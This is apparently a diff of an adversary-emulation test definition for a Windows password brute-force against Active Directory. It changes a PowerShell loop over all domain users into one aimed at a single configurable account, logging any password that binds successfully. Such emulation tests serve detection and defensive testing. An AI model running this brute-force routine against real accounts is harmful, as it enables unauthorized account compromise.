@@ -4,10 +4,14 @@ atomic_tests:
 - name: Brute Force Credentials
   auto_generated_guid: 09480053-2f98-4854-be6e-71ae5f672224
   description: |
-    Creates username and password files then attempts to brute force on remote host
+    Attempt to brute force user on remote host
   supported_platforms:
   - windows
   input_arguments:
+    user:
+        description: Account to bruteforce
+        type: String
+        default: Victim
     passwords:
       description: Path to a file containing a list of passwords we will attempt to brute force with
       type: String
@@ -23,13 +27,10 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-      $DomainUsers = Get-ADUser -Filter * | Select-Object -Property SamAccountName
       $passwords = "#{passwords}".split("`n")
-      $DomainUsers | Foreach-Object {
-        foreach ($password in $passwords){
-          if ((new-object directoryservices.directoryentry "",$_.SamAccountName,$password).psbase.name -ne $null) {
-            "[!] $($_.SamAccountName):$password found on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
-          }
+      foreach ($password in $passwords){
+        if ((new-object directoryservices.directoryentry "",#{user},$password).psbase.name -ne $null) {
+          "[!] #{user}:$password found on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
         }
       }
       "End of bruteforce" | Out-File -FilePath #{output_file} -Append
